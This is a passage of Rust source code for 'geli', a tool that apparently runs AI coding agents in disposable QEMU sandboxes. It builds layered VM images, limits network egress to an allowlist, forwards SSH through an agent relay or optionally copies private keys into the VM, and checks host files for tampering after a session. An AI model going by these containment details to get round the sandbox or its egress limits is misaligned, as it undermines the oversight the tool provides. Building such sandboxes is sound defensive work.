            names.push(stem.to_string());
        }
    }
    names.sort();
    Ok(names)
}

/// The workspace that already lists this directory, if any.
fn workspace_for_dir(current_dir: &Path) -> io::Result<Option<String>> {
    for name in workspace_names()? {
        if let Some(config) = read_workspace(&name)? {
            if config.dirs.iter().any(|d| d == current_dir) {
                return Ok(Some(name));
            }
        }
    }
    Ok(None)
}

fn display_active_workspaces() -> io::Result<()> {
    let names = workspace_names()?;
    if names.is_empty() {
        println!("[*] No active sandbox workspaces found.");
        return Ok(());
    }
    println!("=============================================");
    println!("          ACTIVE WORKSPACE REGISTRY           ");
    println!("=============================================");
    for name in names {
        let Some(config) = read_workspace(&name)? else { continue };
        println!("Workspace: [{}]", name);
        for dir in &config.dirs {
            println!("  -> {}", dir.display());
        }
        if config.ssh {
            println!("  ssh: keys are forwarded into this workspace's sessions");
        }
        if !config.allow.is_empty() {
            println!("  allow: {}", config.allow.join(", "));
        }
        println!("---------------------------------------------");
    }
    Ok(())
}

mod agents;
mod guest;
mod net;
#[cfg(target_os = "linux")]
mod ssh_agent;
mod ui;
#[cfg(target_os = "linux")]
mod qemu;

use agents::*;
use guest::*;
#[cfg(target_os = "linux")]
use ssh_agent::start_agent_relay;
use net::*;
use ui::*;
#[cfg(target_os = "linux")]
use qemu::*;


/// Provision one image by booting a VM that runs a cloud-init recipe and powers itself off.
///
/// Shared by the base image and every agent layer, which differ only in their recipe and in what
/// they hand back. Returns the directory the guest wrote its outputs to; `Ok(None)` means the
/// guest did not print the sentinel, so whatever it produced must not be published.
///
/// Builds into `<name>.building` and the caller renames on success: a failed build must never
/// leave a half-provisioned image standing where a working one was.
#[cfg(target_os = "linux")]
fn run_build_vm(
    pending: &Path,
    recipe: &str,
    instance: &str,
    log_path: &Path,
) -> io::Result<Option<PathBuf>> {
    let stage = staging_dir(&format!("geli-stage-{}-{}", std::process::id(), instance))?;
    let iso = make_cloud_init_iso(&stage, recipe, instance, "geli-build")?;

    // The build VM hands the kernel, initramfs and metadata back through this share.
    let out_dir = staging_dir(&format!("geli-out-{}-{}", std::process::id(), instance))?;
    let out_share = vec![
        "-fsdev".to_string(),
        format!(
            "local,path={},id={},security_model=none",
            out_dir.display(),
            BUILD_OUT_TAG
        ),
        "-device".to_string(),
        format!("virtio-9p-pci,fsdev={},mount_tag={}", BUILD_OUT_TAG, BUILD_OUT_TAG),
    ];

    run_qemu(pending, &iso, out_share, QemuIo::LogTo(log_path.to_path_buf()), None)?.wait()?;
    let _ = fs::remove_dir_all(&stage);

    // cloud-init does not abort runcmd on failure, so "the build finished" proves nothing. The
    // recipe echoes the sentinel only behind a check that every tool is really there.
    let console = fs::read_to_string(log_path).unwrap_or_default();
    if console.contains(BUILD_OK_MARKER) {
        Ok(Some(out_dir))
    } else {
        let _ = fs::remove_dir_all(&out_dir);
        Ok(None)
    }
}

#[cfg(target_os = "linux")]
fn build_failed(pending: &Path, log_path: &Path, what: &str) -> ! {
    let _ = fs::remove_file(pending);
    eprintln!("\n[!] Building {} failed: the guest did not report it ready.", what);
    eprintln!("    Console log kept at {}", log_path.display());
    std::process::exit(1);
}

/// Provision the base image: the toolchain, the sandbox user, autologin — and no agent.
#[cfg(target_os = "linux")]
fn build_base_image(dir: &Path) -> io::Result<()> {
    // GELI_BASE_IMAGE points the build at a different cloud image — for comparing distros. The
    // recipe assumes apk and cloud-init, so Alpine-family images work; others need it changed.
    let cloud_img = match std::env::var_os("GELI_BASE_IMAGE") {
        Some(path) => PathBuf::from(path),
        None => dir.join(CLOUD_IMAGE_NAME),
    };
    if !cloud_img.exists() {
        eprintln!("Error: Cloud image not found at {}", cloud_img.display());
        eprintln!("Run ./setup.sh, or place the base cloud image in {}", dir.display());
        std::process::exit(1);
    }

    let recipe = build_base_cloud_init(host_uid());
    let target = dir.join(BASE_IMAGE_NAME);
    let pending = dir.join(format!("{}.building", BASE_IMAGE_NAME));
    let log_path = dir.join(BASE_LOG_NAME);

    create_overlay(&cloud_img, &pending, Some(SANDBOX_DISK_SIZE))?;

    println!("[*] Building the base image: bash, Node {REQUIRED_NODE_MAJOR}, python3, pip, git.");
    println!("[*] No agent goes in here — each one is its own layer on top.");
    println!("[*] Follow along with:  tail -f {}", log_path.display());

    let Some(out_dir) = run_build_vm(&pending, &recipe, "geli-base", &log_path)? else {
        build_failed(&pending, &log_path, "the base image");
    };

    // Direct boot is useless without these, so a build that did not produce them is a failure
    // even if the guest reported every tool present.
    for name in [KERNEL_NAME, INITRD_NAME, BASE_META_NAME] {
        let produced = out_dir.join(name);
        if !produced.exists() {
            let _ = fs::remove_file(&pending);
            eprintln!("\n[!] Base image build failed: the guest did not hand back {}.", name);
            eprintln!("    Console log kept at {}", log_path.display());
            std::process::exit(1);
        }
        fs::copy(&produced, dir.join(name))?;
    }

    fs::rename(&pending, &target)?;
    fs::write(dir.join(BASE_RECIPE_NAME), recipe_hash(&recipe))?;
    let _ = fs::remove_dir_all(&out_dir);

    // An agent layer built against the old base is not merely stale, it is wrong: it sits on a
    // backing file that no longer exists. Drop them rather than leave broken chains behind.
    let dropped = discard_layers(dir)?;
    if dropped > 0 {
        println!("[*] Discarded {} agent layer(s) built on the previous base image.", dropped);
    }

    println!("\n[✓] Base image ready at {}", target.display());
    Ok(())
}

/// Remove every agent layer — image, recipe, metadata and console log alike. Called when the base
/// image is rebuilt, since a layer's backing file is gone at that point, and a log describing an
/// image that no longer exists is worse than no log. Safe to run here: it happens after the base
/// build and before any layer build, so it never deletes a log that was just written.
#[cfg(target_os = "linux")]
fn discard_layers(dir: &Path) -> io::Result<usize> {
    let mut dropped = 0;
    for entry in fs::read_dir(dir)? {
        let path = entry?.path();
        let name = path.file_name().unwrap_or_default().to_string_lossy().to_string();
        if name.starts_with("geli-layer-") {
            if name.ends_with(".qcow2") {
                dropped += 1;
            }
            let _ = fs::remove_file(&path);
        }
    }
    Ok(dropped)
}

/// The recipe hash a layer must record to be considered current: its parent's hash plus its own
/// recipe. So editing one agent's TOML invalidates that layer and everything stacked on it, and
/// nothing else.
#[cfg(target_os = "linux")]
fn layer_hash(parent_hash: &str, recipe: &str) -> String {
    recipe_hash(&format!("{}\n{}", parent_hash, recipe))
}

/// Build the qcow2 layer for `agent` on top of `parent`, if it is missing or stale.
///
/// Returns the layer's path and its recipe hash, so the next agent in the chain can stack on it.
///
/// Safe to run from several shells at once, which matters because layers are built on *first use*:
/// two tmux panes starting the same agent for the first time is the ordinary way to hit this. One
/// takes the lock and builds; the others wait and then find the layer already there.
#[cfg(target_os = "linux")]
fn ensure_layer(
    dir: &Path,
    agent: &Agent,
    parent: &Path,
    parent_hash: &str,
) -> io::Result<(PathBuf, String)> {
    // Every name this layer owns comes from the agent's command, so there is no separate key that
    // could disagree with the agent being installed.
    let key = agent.command.as_str();
    let recipe = build_layer_cloud_init(agent, host_uid());
    let hash = layer_hash(parent_hash, &recipe);

    let target = dir.join(layer_image_name(key));
    let recipe_path = dir.join(layer_recipe_name(key));
    let lock_path = dir.join(layer_lock_name(key));

    // Checked inside the loop, not before it: a waiter's whole purpose is to re-read this after
    // the other process has published its work.
    let current = || {
        target.exists()
            && fs::read_to_string(&recipe_path).unwrap_or_default().trim() == hash
    };

    let _lock = loop {
        if current() {
            return Ok((target, hash));
        }
        match try_build_lock(&lock_path)? {
            Some(lock) => break lock,
            None => {
                if !wait_for_builder(&lock_path, &agent.command, std::time::Duration::from_secs(1800)) {
                    eprintln!(
                        "\n[!] Gave up waiting for another geli to build the {} layer.",
                        agent.command
                    );
                    eprintln!("    If nothing is building, remove {}", lock_path.display());
                    std::process::exit(1);
                }
            }
        }
    };

    // Keyed by pid as well as by image. The lock already makes a collision impossible, but a
    // shared path meant a crashed build left a file the next one would silently build on top of.
    let pending = dir.join(format!("{}.building.{}", layer_image_name(key), std::process::id()));
    let log_path = dir.join(layer_log_name(key));
    let _ = fs::remove_file(&pending);
    create_overlay(parent, &pending, None)?;

    eprintln!(
        "[*] Building the {} layer, once. Follow along with:  tail -f {}",
        agent.command,
        log_path.display()
    );

    let instance = format!("geli-layer-{}", key);
    let Some(out_dir) = run_build_vm(&pending, &recipe, &instance, &log_path)? else {
        build_failed(&pending, &log_path, &format!("the {} layer", agent.command));
    };

    let meta_name = layer_meta_name(key);
    let produced = out_dir.join(&meta_name);
    if produced.exists() {
        fs::copy(&produced, dir.join(&meta_name))?;
    }
    let _ = fs::remove_dir_all(&out_dir);

    fs::rename(&pending, &target)?;
    fs::write(&recipe_path, &hash)?;
    eprintln!("[✓] {} layer ready.", agent.command);
    Ok((target, hash))
}

/// The image a session should overlay: the invoked agent's layer, built if it is missing, or the
/// base image when the command is not an agent at all.
///
/// One agent, deliberately — see `docs/plans/05-varios-agentes-por-vm.md`. This used to walk a
/// variable-length chain so a session could carry several agents, but nothing ever asked for more
/// than one, and that design was rejected rather than left pending.
///
/// Also returns the metadata the status block prints as the contents of the image: the base's,
/// plus the layer's own entry.
#[cfg(target_os = "linux")]
fn resolve_image(dir: &Path, agent: Option<&Agent>) -> io::Result<(PathBuf, ImageMeta)> {
    let base = dir.join(BASE_IMAGE_NAME);
    let mut meta = parse_image_meta(&fs::read_to_string(dir.join(BASE_META_NAME)).unwrap_or_default());

    // A command geli does not know gets the base image itself — the cheapest boot there is, and
    // one with no agent in it at all.
    let Some(agent) = agent else {
        return Ok((base, meta));
    };

    let base_hash = fs::read_to_string(dir.join(BASE_RECIPE_NAME)).unwrap_or_default().trim().to_string();
    let (layer, _) = ensure_layer(dir, agent, &base, &base_hash)?;
    merge_image_meta(
        &mut meta,
        &fs::read_to_string(dir.join(layer_meta_name(&agent.command))).unwrap_or_default(),
    );

    Ok((layer, meta))
}

/// Whether the base image on disk is the one this binary's recipe describes.
///
/// Checked so `--build-image` is idempotent: `--build-image --agents claude` must be able to add
/// a layer without rebuilding the image that layer is going to sit on — which would also discard
/// every other layer along the way.
#[cfg(target_os = "linux")]
fn base_is_current(dir: &Path) -> bool {
    let recorded = fs::read_to_string(dir.join(BASE_RECIPE_NAME)).unwrap_or_default();
    dir.join(BASE_IMAGE_NAME).exists()
        && recorded.trim() == recipe_hash(&build_base_cloud_init(host_uid()))
}

#[cfg(target_os = "linux")]
fn build_images(selected: &[String]) -> io::Result<()> {
    check_host_tools();
    let dir = images_dir();

    // Anyone upgrading has a ~900 MB single image sitting there that nothing reads any more.
    // Said, not deleted: it is the user's file, and it is the only way back to the old binary.
    let legacy = dir.join(LEGACY_IMAGE_NAME);
    if legacy.exists() {
        // Blocks, not length: a qcow2 is sparse, and `len()` reports the virtual size, which
        // overstates what deleting the file would actually give back by about twofold.
        use std::os::unix::fs::MetadataExt;
        let size = fs::metadata(&legacy).map(|m| m.blocks() * 512 / 1_048_576).unwrap_or(0);
        println!("[*] {} ({} MB) is from before images were layered and is", LEGACY_IMAGE_NAME, size);
        println!("    no longer used. Delete it when you are sure you do not want to go back.");
    }

    if base_is_current(&dir) {
        println!("[*] Base image is already current.");
        println!("    Delete {} to force a rebuild.", dir.join(BASE_IMAGE_NAME).display());
    } else {
        build_base_image(&dir)?;
    }

    // Each named agent gets its own layer directly on the base, not one chain through all of
    // them: a session invokes one agent, and sibling layers are what it can actually reuse.
    for name in selected {
        let Some(agent) = agent_for_command(name) else {
            eprintln!(
                "[!] `{}` is not an agent geli knows ({}). Skipped.",
                name,
                agents().iter().map(|a| a.command.as_str()).collect::<Vec<_>>().join(", ")
            );
            continue;
        };
        resolve_image(&dir, Some(agent))?;
    }

    println!("    Sandbox sessions boot its kernel directly, installing nothing.");
    if selected.is_empty() {
        println!("    An agent's layer is built the first time you run it, or now with:");
        println!(
            "      geli --build-image --agents <{}>",
            agents().iter().map(|a| a.command.as_str()).collect::<Vec<_>>().join("|")
        );
    }
    Ok(())
}

/// The host's `ssh-agent` socket, or a refusal that says what to do about it.
///
/// **Never falls back to copying the key.** Falling quietly to the less safe mode is the exact
/// shape of failure the rest of this project exists to avoid: the user asked for `--ssh`, got
/// something, and has no way to tell which one they got. `--ssh-copy-key` is there for anyone who
/// genuinely wants the old behaviour, and it says so in its name.
#[cfg(target_os = "linux")]
fn host_agent_socket() -> io::Result<PathBuf> {
    let sock = std::env::var_os("SSH_AUTH_SOCK").map(PathBuf::from).filter(|p| p.exists());
    sock.ok_or_else(|| {
        io::Error::new(
            io::ErrorKind::NotFound,
            "--ssh forwards the host's ssh-agent, and no agent is running (SSH_AUTH_SOCK is \
             unset or stale).\n    Start one and load a key:  eval \"$(ssh-agent -s)\" && \
             ssh-add\n    Or copy the private key into the VM instead, which is weaker: \
             --ssh-copy-key",
        )
    })
}

/// Which identity the session may sign with.
///
/// `--ssh-key` names one, and the blob that identifies it to the agent is the one in its `.pub`
/// file. Without that file there is nothing to match against, so the restriction cannot be
/// honoured — and a flag that silently restricts nothing is worse than one that says it could not.
#[cfg(target_os = "linux")]
fn granted_key(ssh_key: Option<&Path>) -> io::Result<ssh_agent::Granted> {
    let Some(key) = ssh_key else { return Ok(ssh_agent::Granted::All) };

    let base = key.to_string_lossy();
    let base = base.strip_suffix(".pub").unwrap_or(&base);
    let pub_path = PathBuf::from(format!("{}.pub", base));

    match fs::read_to_string(&pub_path).ok().and_then(|l| ssh_agent::public_key_blob(&l)) {
        Some(blob) => Ok(ssh_agent::Granted::Only(blob)),
        None => {
            eprintln!(
                "[!] --ssh-key names {} but {} is missing or unreadable, so the session is not\n\
                 \x20   restricted to that key: every identity the agent holds can be used.\n\
                 \x20   Adding or removing keys is still refused.",
                key.display(),
                pub_path.display()
            );
            Ok(ssh_agent::Granted::All)
        }
    }
}

/// The user's `known_hosts`, for putting a name to a host key a session signed toward.
///
/// **Line by line, never all at once.** `KnownHosts::read_file` collects into one `Result`, so a
/// single entry it cannot parse — a `ssh-dss` line left over from years ago is enough — throws
/// away every other entry in the file. Measured: a two-line file with one such line yields an
/// error and zero entries. The failure would be silent and would look like "geli cannot name
/// anything", so each line is taken on its own and the ones that do not parse are dropped.
#[cfg(target_os = "linux")]
fn read_known_hosts(home: &Path) -> Vec<ssh_key::known_hosts::Entry> {
    let Ok(text) = fs::read_to_string(home.join(".ssh").join("known_hosts")) else {
        return Vec::new();
    };
    ssh_key::KnownHosts::new(&text).flatten().collect()
}

/// What ssh needs in the guest: `known_hosts`, a generated config, and — only under
/// `--ssh-copy-key` — the private keys themselves.
///
/// **`copy_keys` is false on the normal path.** With the agent forwarded there is no key to copy,
/// and no `IdentityFile` lines either: the identities come from the agent, which is the whole
/// point. What is still needed is everything about *the hosts being talked to*.
pub(crate) fn collect_ssh_credentials(
    home: &Path,
    ssh_key: Option<&Path>,
    copy_keys: bool,
) -> io::Result<Vec<(String, String)>> {
    let mut creds = Vec::new();
    let ssh_dir = home.join(".ssh");

    let mut found_any_key = false;
    let mut key_names = Vec::new();

    if !copy_keys {
        // Nothing of the user's private material crosses; skip straight to the host knowledge.
        found_any_key = true;
    } else if let Some(explicit_path) = ssh_key {
        let resolved = if explicit_path.starts_with("~/") || explicit_path == Path::new("~") {
            if let Ok(stripped) = explicit_path.strip_prefix("~") {
                home.join(stripped)
            } else {
                explicit_path.to_path_buf()
            }
        } else if explicit_path.is_relative() {
            std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")).join(explicit_path)
        } else {
            explicit_path.to_path_buf()
        };

        // If the user specified a .pub file, prefer the private key counterpart if available
        let resolved = if resolved.extension().and_then(|e| e.to_str()) == Some("pub") {
            let priv_candidate = resolved.with_extension("");
            if priv_candidate.exists() {
                priv_candidate
            } else {
                resolved
            }
        } else {
            resolved
        };

        if !resolved.exists() {
            return Err(io::Error::new(
                io::ErrorKind::NotFound,
                format!("SSH key not found at '{}'", resolved.display()),
            ));
        }

        let content = fs::read_to_string(&resolved)?;
        let key_name = resolved
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("id_custom")
            .to_string();

        creds.push((format!(".ssh/{}", key_name), content));
        key_names.push(key_name.clone());
        found_any_key = true;

        let pub_path = PathBuf::from(format!("{}.pub", resolved.display()));
        if pub_path.exists() {
            if let Ok(pub_content) = fs::read_to_string(&pub_path) {
                creds.push((format!(".ssh/{}.pub", key_name), pub_content));
            }
        }
    } else {
        const DEFAULT_KEYS: &[&str] = &["id_ed25519", "id_ecdsa", "id_rsa"];
        for key in DEFAULT_KEYS {
            let key_path = ssh_dir.join(key);
            if key_path.exists() {
                if let Ok(content) = fs::read_to_string(&key_path) {
                    creds.push((format!(".ssh/{}", key), content));
                    key_names.push(key.to_string());
                    found_any_key = true;

                    let pub_path = ssh_dir.join(format!("{}.pub", key));
                    if pub_path.exists() {
                        if let Ok(pub_content) = fs::read_to_string(&pub_path) {
                            creds.push((format!(".ssh/{}.pub", key), pub_content));
                        }
                    }
                }
            }
        }
    }

    if !found_any_key {
        eprintln!(
            "[!] SSH forwarding was requested, but no SSH private keys were found in {}.\n\
             \x20   Specify a key explicitly with --ssh-key <path>.",
            ssh_dir.display()
        );
    }

    let known_hosts_path = ssh_dir.join("known_hosts");
    let mut has_known_hosts = false;
    if let Ok(known_hosts) = fs::read_to_string(&known_hosts_path) {
        has_known_hosts = !known_hosts.trim().is_empty();
        creds.push((".ssh/known_hosts".to_string(), known_hosts));
    }

    // `accept-new` only where there is nothing to check against. With the host's `known_hosts`
    // forwarded — which is the normal case, and github.com is almost certainly already in it —
    // strict checking costs nothing and keeps the one warning you would get if the host you are
    // pushing to were not the host you think. Blanket `accept-new` trusts whatever answers first,
    // and a sandbox is exactly where an unexpected answer deserves to be noticed.
    //
    // Without `known_hosts` the choice is between `accept-new` and a session that hangs on a
    // prompt nobody is there to answer, so it is `accept-new` and geli says so.
    let strict = if has_known_hosts {
        "yes"
    } else {
        eprintln!(
            "[!] No ~/.ssh/known_hosts to forward, so the sandbox will trust whichever host\n\
             \x20   answers first (StrictHostKeyChecking=accept-new)."
        );
        "accept-new"
    };

    let mut config_lines = vec![
        "Host *".to_string(),
        format!("    StrictHostKeyChecking {}", strict),
    ];
    for name in &key_names {
        config_lines.push(format!("    IdentityFile ~/.ssh/{}", name));
    }
    config_lines.push(String::new());
    creds.push((".ssh/config".to_string(), config_lines.join("\n")));

    Ok(creds)
}

/// How a session gets to use the host's SSH key.
///
/// **`Agent` is the default because `CopyKey` cannot be made safe.** A copied private key is
/// readable by the agent inside the VM and stays valid long after the disposable VM is gone; a
/// forwarded agent socket lets the guest *sign* and never hands over the key. The difference is
/// permanent exposure against exposure bounded by the session, which is the honest claim —
/// see `docs/plans/08-reenviar-agente-ssh.md`.
#[derive(Debug, Clone, Copy, PartialEq)]
pub(crate) enum SshMode {
    Off,
    Agent,
    CopyKey,
}

/// What this invocation is allowed to carry into the sandbox, and how far it may reach.
///
/// Grouped rather than passed as four more arguments: they are one decision — how much of the
/// host this session gets — and reading them together is how you see that `--no-credentials`
/// turns off SSH forwarding too.
pub(crate) struct SessionPolicy<'a> {
    /// Copy the invoked agent's credentials out of the user's home.
    pub(crate) credentials: bool,
    /// How the sandbox gets to use the host's SSH key, if at all. Implies `credentials`.
    pub(crate) ssh: SshMode,
    /// Restrict to this key instead of every identity the agent holds.
    pub(crate) ssh_key: Option<&'a Path>,
    /// Cut egress to the allowlist.
    pub(crate) restrict_net: bool,
    /// Extra hosts this workspace may reach on top of `DEFAULT_ALLOWED_HOSTS`. Comes from the
    /// host's registry, never from the project — a file the sandbox can write must not be able to
    /// widen its own egress.
    pub(crate) allow: &'a [String],
}

/// Owns the session's scratch files, so they go away however the session leaves — an error on
/// any of the two dozen `?`s between here and the end, or a panic.
///
/// **`Drop` does not run on `process::exit`, so the guard is only half of this.** The other half
/// is that nothing between creating these files and the end of the session exits the process; the
/// one call that did now returns an error. A guard with an `exit` still live underneath it is
/// worse than no guard, because it reads as if the cleanup were handled.
///
/// Before this, a failure anywhere past the overlay left a qcow2 and a share directory in `/tmp`
/// for nobody to notice — and failures are exactly when the files are large.
struct SessionScratch {
    image: PathBuf,
    share: PathBuf,
    keep: bool,
}

impl Drop for SessionScratch {
    fn drop(&mut self) {
        if self.keep {
            return;
        }
        let _ = fs::remove_file(&self.image);
        let _ = fs::remove_dir_all(&self.share);
    }
}

#[cfg(target_os = "linux")]
fn execute_sandbox(
    ws: &str,
    cur: &Path,
    dirs: Vec<PathBuf>,
    cmd: &GuestCommand,
    packages: &Packages,
    policy: &SessionPolicy,
) -> io::Result<()> {
    let SessionPolicy {
        credentials: forward_credentials,
        ssh: forward_ssh,
        ssh_key,
        restrict_net,
        allow: extra_allowed_hosts,
    } = *policy;

    let pid = std::process::id();
    let home = dirs_home_dir().unwrap_or_else(|| PathBuf::from("/tmp"));
    // Set GELI_KEEP=1 to preserve the session disk and cloud-init files for debugging.
    let keep_session = std::env::var_os("GELI_KEEP").is_some();

    let started = std::time::Instant::now();
    check_host_tools();

    let images = images_dir();
    let base_img = images.join(BASE_IMAGE_NAME);
    if !base_img.exists() {
        eprintln!("\n[!] Error: Base image not found at {}", base_img.display());
        if images.join(LEGACY_IMAGE_NAME).exists() {
            eprintln!(
                "{} is from before images were layered and cannot be used.",
                LEGACY_IMAGE_NAME
            );
            eprintln!("Delete it and rebuild — the new base image carries no agents, so it is");
            eprintln!("smaller, and each agent becomes its own layer.");
        }
        eprintln!("Build it once with:\n  geli --build-image\n");
        std::process::exit(1);
    }

    let meta_path = images.join(BASE_META_NAME);
    let kernel = images.join(KERNEL_NAME);
    let initrd = images.join(INITRD_NAME);
    for required in [&meta_path, &kernel, &initrd] {
        if !required.exists() {
            eprintln!("\n[!] Error: {} is missing.", required.display());
            eprintln!("Sessions boot the image's kernel directly. Rebuild it once with:");
            eprintln!("  geli --build-image\n");
            std::process::exit(1);
        }
    }

    // Stale images still boot — they are merely out of date, not broken.
    let expected = recipe_hash(&build_base_cloud_init(host_uid()));
    let recorded = fs::read_to_string(images.join(BASE_RECIPE_NAME)).unwrap_or_default();
    if recorded.trim() != expected {
        eprintln!("[!] The base image was built from a different recipe than this binary expects.");
        eprintln!("    Rebuild when convenient:  geli --build-image");
    }

    let agent = agent_for_command(&cmd.program);

    // The base image carries no agent, so the invoked one's layer has to exist before the
    // session can overlay anything. Missing means first use: build it now, once, and say so —
    // this is the only time geli takes minutes instead of seconds.
    let (session_backing, meta) = resolve_image(&images, agent)?;

    let host_cache_dir = home.join(".cache").join("geli-sandbox");
    let npm_cache = host_cache_dir.join("npm");
    let pip_cache = host_cache_dir.join("pip");
    let apk_cache = host_cache_dir.join("apk");
    fs::create_dir_all(&npm_cache)?;
    fs::create_dir_all(&pip_cache)?;
    fs::create_dir_all(&apk_cache)?;

    // Read before anything is built: a name geli will not install should stop the run here, with
    // the offending entry on screen, rather than after a VM has booted.
    let rejected = rejected_package_names(packages);
    if !rejected.is_empty() {
        eprintln!(
            "[!] {} in {} declares package names geli will not install:\n\
             \x20     {}\n\
             \x20   A name may hold letters, digits and - _ . + @ = — and must be a package: not\n\
             \x20   a place (no leading . / or ~, no path; npm may use one @scope/name slash),\n\
             \x20   and not an option (nothing starting with -).\n\
             \x20   These run their own install scripts while the sandbox still has a network,\n\
             \x20   so a local directory here would be code geli fetched and ran for you.",
            LOCAL_CONFIG_FILE,
            cur.display(),
            rejected.join("\n      ")
        );
        std::process::exit(1);
    }

    // Consent, after shape. Still before the scratch files exist, so the prompt may be answered
    // with Ctrl-C without leaving an overlay behind — nothing between the scratch and the end of
    // the session may leave the process.
    //
    // **A separate binding, not a shadow of `packages`.** What gets installed is the approved
    // set; what the end-of-session prompt merges into is the project's own declared list. Letting
    // the second be the first means a user who declines the approval and then keeps a discovered
    // package writes their whole declared list out of `.geli.json`.
    let to_install = approved_packages(ws, cur, packages)?;

    let vm_share_dir = staging_dir(&format!("sandbox-share-{}", pid))?;
    let sandbox_img = PathBuf::from(format!("/tmp/sandbox-session-{}.qcow2", pid));
    let scratch = SessionScratch {
        image: sandbox_img.clone(),
        share: vm_share_dir.clone(),
        keep: keep_session,
    };

    let cur_canon = cur.canonicalize()?;

    // The proxy has to exist before the guest's own configuration is generated, not just before
    // it boots: the egress ruleset names the one port the guest may reach, and that port is
    // whatever the OS handed the listener. So this comes before `build_mount_script`.
    let proxy = if restrict_net {
        let allow = session_allowlist(agent, extra_allowed_hosts);
        let count = allow.len();
        Some((start_proxy(allow, vm_share_dir.join("net.log"))?, count))
    } else {
        None
    };
    let proxy_port = proxy.as_ref().map(|(p, _)| p.port);

    // Same reason as the proxy, one line up: the egress ruleset names this port and the guest's
    // relay script dials it, and the port is whatever the OS handed the listener. Returns rather
    // than exits — `SessionScratch` is live by now, and `Drop` does not run on `process::exit`.
    let agent_relay = match forward_ssh {
        SshMode::Agent => Some(start_agent_relay(&host_agent_socket()?, granted_key(ssh_key)?)?),
        _ => None,
    };
    let agent_port = agent_relay.as_ref().map(|r| r.port);
    let agent_dial = agent_relay.as_ref().map(|r| (r.port, r.token.as_str()));

    let plan = build_mount_script(
        &dirs,
        &cur_canon,
        &build_package_setup(&to_install),
        &build_agent_relay(agent_dial),
        &build_lockdown(proxy_port),
    );

    let qemu_args = share_args(
        &dirs,
        &[("npmcache", npm_cache), ("pipcache", pip_cache), ("apkcache", apk_cache)],
    );
    let status_mounts = status_mounts(&dirs, &cur_canon);

    // `agent` and the image chain were resolved above, before anything was overlaid.
    let anthropic_key = std::env::var("ANTHROPIC_API_KEY").unwrap_or_default();
    let openai_key = std::env::var("OPENAI_API_KEY").unwrap_or_default();

    // Only the invoked agent's credentials travel, and only the credential — not the history
    // sitting beside it. Opt out entirely with --no-credentials.
    let agent_credentials: Vec<(String, String)> = match (forward_credentials, agent) {
        (true, Some(agent)) => agent
            .credentials
            .iter()
            .filter_map(|rel| {
                fs::read_to_string(home.join(rel)).ok().map(|c| (rel.to_string(), c))
            })
            .collect(),
        _ => Vec::new(),
    };

    let ssh_credentials = match forward_ssh {
        SshMode::Off => Vec::new(),
        // With the agent forwarded there is no key to copy — only what ssh still needs to know
        // about the hosts it is talking to.
        mode => collect_ssh_credentials(&home, ssh_key, mode == SshMode::CopyKey)
            .map_err(|e| io::Error::other(format!("reading SSH credentials: {}", e)))?,
    };

    let mut credentials = agent_credentials.clone();
    credentials.extend(ssh_credentials.clone());

    let has_credentials = !anthropic_key.trim().is_empty()
        || !openai_key.trim().is_empty()
        || !agent_credentials.is_empty();

    for warning in
        session_warnings(
            agent,
            &cmd.program,
            has_credentials,
            forward_ssh != SshMode::Off,
            forward_ssh == SshMode::CopyKey,
            restrict_net,
        )
    {
        eprintln!("{}", warning);
    }

    let api_key_for_config = anthropic_key.clone();

    let mut env_exports = build_env_exports(&[
        ("ANTHROPIC_API_KEY", anthropic_key),
        ("OPENAI_API_KEY", openai_key),
    ]);
    // Where npm and pip put a session's packages, now that neither installs as root. Unconditional
    // because the agent may install something itself mid-session, and a tool that is on disk but
    // not on PATH is indistinguishable from one that failed to install.
    env_exports.push('\n');
    env_exports.push_str(&format!("export PATH={}/bin:$PATH", USER_PREFIX));

    let proxy_env = build_proxy_env(proxy.as_ref().map(|(p, _)| (p.port, p.token.as_str())));
    if !proxy_env.is_empty() {
        env_exports.push('\n');
        env_exports.push_str(&proxy_env);
    }
    // Where the guest's ssh clients look for the agent. Exported only when the relay is running:
    // a stale `SSH_AUTH_SOCK` makes ssh fail with a confusing error instead of falling back to
    // asking for a key.
    if agent_port.is_some() {
        env_exports.push('\n');
        env_exports.push_str(&format!("export SSH_AUTH_SOCK={}", shell_quote(AGENT_SOCKET)));
    }
    env_exports.push('\n');
    env_exports.push_str(&build_terminal_setup(
        &std::env::var("TERM").unwrap_or_default(),
        &std::env::var("COLORTERM").unwrap_or_default(),
        host_terminal_size(),
    ));

    // Not gated on --no-credentials: these are built from this sandbox's own workspace, not read
    // from the user's home, so there is nothing to opt out of. And an agent running on a bare
    // ANTHROPIC_API_KEY still needs its onboarding answered.
    let seed = match agent {
        Some(a) => seed_files(a, &plan.folders, &api_key_for_config),
        None => Vec::new(),
    };

    let user_data = build_cloud_init(
        &plan,
        &cmd.line,
        &env_exports,
        &credentials,
        &seed,
        proxy_port,
        agent_port,
    );
    let iso = make_cloud_init_iso(
        &vm_share_dir,
        &user_data,
        &format!("geli-{}", pid),
        &format!("sandbox-{}", ws),
    )?;

    // The session overlay sits on top of the agent layer (or the base image, for a command that
    // is not an agent) and inherits its virtual size.
    create_overlay(&session_backing, &sandbox_img, None)?;

    let base_auth = match (agent_credentials.is_empty(), agent) {
        (false, Some(a)) => format!("{} · bills your plan", a.label),
        (true, _) if !api_key_for_config.trim().is_empty() => {
            "ANTHROPIC_API_KEY · bills API credits".to_string()
        }
        _ => "none".to_string(),
    };
    // **The two modes must not read alike.** One of them copied a private key out of the user's
    // home and the other did not, and the status block is where that is said.
    let ssh_note = match forward_ssh {
        SshMode::Agent => Some("ssh-agent forwarded · key stays on the host"),
        SshMode::CopyKey => Some("SSH private key COPIED into the VM"),
        SshMode::Off => None,
    };
    let auth = match (ssh_note, base_auth.as_str()) {
        (None, _) => base_auth,
        (Some(note), "none") => note.to_string(),
        (Some(note), _) => format!("{} + {}", base_auth, note),
    };
    let net = match &proxy {
        Some((_, count)) => format!("restricted · {} domains allowed", count),
        None => "open · unrestricted".to_string(),
    };
    eprint!(
        "{}",
        render_status(
            ws,
            &status_mounts,
            &auth,
            &credentials.iter().map(|(p, _)| p.clone()).collect::<Vec<_>>(),
            &describe_image(&meta),
            &net,
            &describe_packages(&to_install, restrict_net),
        )
    );

    let console_log = vm_share_dir.join("console.log");
    let direct = DirectBoot {
        kernel,
        initrd,
        cmdline: boot_cmdline(&meta.cmdline),
        console_log: console_log.clone(),
    };

    // Taken before the guest can touch anything, and compared after it exits.
    let host_executed_before = fingerprint_host_executed(&dirs);

    let mut child = run_qemu(
        &sandbox_img,
        &iso,
        qemu_args,
